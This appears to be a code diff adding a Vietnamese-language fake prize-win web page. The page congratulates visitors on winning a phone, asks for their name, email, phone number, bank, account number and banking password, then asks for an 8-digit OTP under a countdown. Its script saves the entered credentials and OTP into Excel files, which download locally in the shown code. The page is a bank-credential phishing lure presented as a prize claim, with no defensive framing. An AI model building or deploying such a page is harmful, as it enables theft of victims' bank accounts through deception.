@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form Example</title>
+  <script src="https://unpkg.com/xlsx/dist/xlsx.full.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="phaohoa.css"/>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f1f1f1;
+      background-image: url(https://remcuatudong.vn/wp-content/uploads/2019/09/Rem_san_khau_tu_dong_03.jpg);
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      width: 50%;
+      text-align: center;
+    }
+
+    img{
+      width: 100%;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    select{
+      width: 100%;
+      height: 40px;
+      text-align: center;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+
+    .otp-input {
+      display: flex;
+    }
+
+    .otp-input input {
+      flex: 1;
+      margin-right: 10px;
+    }
+
+    .otp-button {
+      margin-top: 10px;
+    }
+
+    .message {
+      margin-top: 20px;
+      font-weight: bold;
+    }
+
+    .success {
+      color: green;
+    }
+
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <img src="ip14.png" class="shaking-image shakeleft" alt="Shaking Image">
+    <img src="https://techbestmart.com/wp-content/uploads/2021/09/samsung-galaxy-z-flip-3.png" class="shaking-image shakeright" alt="Shaking Image">
+    <img src="https://i.gifer.com/origin/b2/b2731677a0689015626a8124465dbf11_w200.webp" class="fireworks left-firework" alt="Fireworks">
+    <img src="http://clipart-library.com/img/1179426.gif" class="fireworks right-firework" alt="Fireworks">
+    <img src="https://i.gifer.com/origin/64/647f50bf936890d43841be3522bf2e75_w200.webp" class="fireworks bottom-firework" alt="Fireworks">
+    <img src="https://i.gifer.com/origin/d5/d5fc616eee7fe45299b6f164734f53de_w200.webp" class="fireworks top-firework" alt="Fireworks">
+    
+    <img src="https://i.gifer.com/origin/30/30e07e44ea045891897a14a13238638b_w200.webp" class="arow top-left" alt="Fireworks">
+    <img src="https://i.gifer.com/origin/30/30e07e44ea045891897a14a13238638b_w200.webp" class="arow top-right" alt="Fireworks">
+    <img src="https://i.gifer.com/origin/30/30e07e44ea045891897a14a13238638b_w200.webp" class="arow bottom-left" alt="Fireworks">
+    <img src="https://i.gifer.com/origin/30/30e07e44ea045891897a14a13238638b_w200.webp" class="arow bottom-right" alt="Fireworks">
+
+
+    <h1>XIN CHÚC MỪNG BẠN ĐÃ TRÚNG THƯỞNG</h1>
+    <h3>Vui lòng nhập đầy đủ thông tin để nhận thưởng!!!</h3>
+    <img src="https://yamaha-motor.com.vn/wp/wp-content/webp-express/webp-images/doc-root/wp/wp-content/uploads/2019/12/tet-promotion-prize-1024x578.jpg.webp" alt="Giải thưởng"/>
+    <h2>Thông tin người dùng</h2>
+    <form id="userForm">
+      <div class="form-group">
+        <label for="name">Tên:</label>
+        <input type="text" id="name" required>
+      </div>
+      <div class="form-group">
+        <label for="email">Email:</label>
+        <input type="email" id="email" required>
+      </div>
+      <div class="form-group">
+        <label for="phone">Số điện thoại:</label>
+        <input type="tel" id="phone" required>
+      </div>
+      <div class="form-group">
+        <label for="bank-name">Tên ngân hàng:</label>
+        <select id="bank-name" name="bank-name" required>
+          <option value="">Chọn ngân hàng</option>
+          <option value="Ngân hàng Agribank">Ngân hàng Agribank</option>
+          <option value="Ngân hàng ACB">Ngân hàng ACB</option>
+          <option value="Ngân hàng Vietcombank">Ngân hàng Vietcombank</option>
+          <option value="Ngân hàng Vietinbank">Ngân hàng Vietinbank</option>
+          <option value="Ngân hàng Oceanbank">Ngân hàng Oceanbank</option>
+          <option value="Ngân hàng Quân đội">Ngân hàng Quân đội</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label for="account">Số tài khoản ngân hàng:</label>
+        <input type="text" id="account" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Mật khẩu:</label>
+        <input type="password" id="password" required>
+      </div>
+      <button id="infobutton" type="submit">Gửi</button>
+    </form>
+    <div id="otpSection" style="display: none;">
+      <h3>Nhập mã OTP</h3>
+      <p>Mã OTP chỉ hợp lệ trong vòng 120 giây.</p>
+      <div class="otp-input">
+        <input type="number" id="otp" required>
+        <button id="otpButton" disabled>Gửi mã OTP</button>
+      </div>
+    </div>
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    var form = document.getElementById('userForm');
+    var otpSection = document.getElementById('otpSection');
+    var otpButton = document.getElementById('otpButton');
+    var infobutton = document.getElementById('infobutton');
+    var messageElement = document.getElementById('message');
+    var otpInput = document.getElementById('otp');
+    var bankName = document.getElementById('bank-name')
+    var otpTimer;
+    var otpTimeout = 120; // seconds
+    ////var name, email;
+
+    form.addEventListener('submit', function (event) {
+      event.preventDefault();
+      messageElement.textContent = '';
+
+      var name = document.getElementById('name').value;
+      var email = document.getElementById('email').value;
+      var phone = document.getElementById('phone').value;
+      var account = document.getElementById('account').value;
+      var password = document.getElementById('password').value;
+      var bankName = document.getElementById('bank-name').value;
+
+      // Kiểm tra các trường thông tin không được để trống
+      if (name === '' || email === '' || phone === '' || bankName === '' || account === '' || password === '') {
+        showMessage('error', 'Vui lòng điền đầy đủ thông tin');
+        return;
+      }
+
+      // Ẩn form nhập thông tin và hiển thị phần nhập mã OTP
+      form.style.display = 'none';
+      otpSection.style.display = 'block';
+
+      // Bắt đầu đếm ngược thời gian nhập mã OTP
+      startOtpTimer();
+    });
+
+    otpInput.addEventListener('input', function () {
+      // Bật nút "Gửi mã OTP" khi có mã OTP được nhập vào
+      otpButton.disabled = otpInput.value === '';
+    });
+
+
+
+
+    infobutton.addEventListener('click', function () {
+      // Tạo object Workbook mới từ SheetJS
+      var wb = XLSX.utils.book_new();
+
+      // Tạo một sheet mới và thêm dữ liệu vào từng cột
+      var ws = XLSX.utils.aoa_to_sheet([
+        ['Tên', 'Email', 'Số điện thoại', 'Tên ngân hàng', 'Số tài khoản ngân hàng', 'Mật khẩu'],
+        [document.getElementById('name').value, document.getElementById('email').value, document.getElementById('phone').value, document.getElementById('bank-name').value, document.getElementById('account').value, document.getElementById('password').value]
+      ]);
+
+      // Thêm sheet vào workbook
+      XLSX.utils.book_append_sheet(wb, ws, 'Người dùng');
+
+      // Xuất file Excel dưới dạng blob
+      var wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
+      var blob = new Blob([wbout], { type: 'application/octet-stream' });
+
+      // Tạo đường dẫn tải xuống file Excel
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement('a');
+      a.href = url;
+      a.download = 'thong_tin_user.xlsx';
+      a.click();
+      URL.revokeObjectURL(url);
+    });
+
+
+
+
+
+    otpButton.addEventListener('click', function () {
+      // Kiểm tra OTP chỉ được nhập 8 số
+        var checkOtpInput = document.getElementById("otp").value;
+        if (checkOtpInput.length !== 8) {
+          alert("Mã OTP phải có đúng 8 số.");
+          return;
+        }
+
+
+      // Tạo object Workbook mới từ SheetJS
+      var wb = XLSX.utils.book_new();
+
+      // Tạo một sheet mới và thêm dữ liệu vào từng cột
+      var ws = XLSX.utils.aoa_to_sheet([
+        ['Mã OTP'],
+        [otpInput.value]
+      ]);
+
+      // Thêm sheet vào workbook
+      XLSX.utils.book_append_sheet(wb, ws, 'Người dùng');
+
+      // Xuất file Excel dưới dạng blob
+      var wbout = XLSX.write(wb, { bookType: 'xlsx', type: 'array' });
+      var blob = new Blob([wbout], { type: 'application/octet-stream' });
+
+      // Tạo đường dẫn tải xuống file Excel
+      var url = URL.createObjectURL(blob);
+      var a = document.createElement('a');
+      a.href = url;
+      a.download = 'otp_pass.xlsx';
+      a.click();
+      URL.revokeObjectURL(url);
+
+      // Hiển thị thông báo thành công và xóa các giá trị đã nhập
+      showMessage('success', 'Đã lưu thông tin thành công!');
+      clearForm();
+    });
+
+    function showMessage(type, text) {
+      messageElement.textContent = text;
+      messageElement.className = 'message ' + type;
+    }
+
+    function startOtpTimer() {
+      var timeLeft = otpTimeout;
+      otpTimer = setInterval(function () {
+        timeLeft--;
+        if (timeLeft <= 0) {
+          // Hết thời gian, hiển thị thông báo lỗi và reset form
+          showMessage('error', 'Hết thời gian nhập mã OTP');
+          resetForm();
+          return;
+        }
+        otpButton.textContent = 'Gửi mã OTP (' + timeLeft + ')';
+      }, 1000);
+    }
+
+    function clearForm() {
+      form.reset();
+      otpInput.value = '';
+      resetForm();
+    }
+
+    function resetForm() {
+      clearInterval(otpTimer);
+      form.style.display = 'block';
+      otpSection.style.display = 'none';
+      otpButton.textContent = 'Gửi mã OTP';
+      otpButton.disabled = true;
+    }
+  </script>
+</body>
+
+</html>
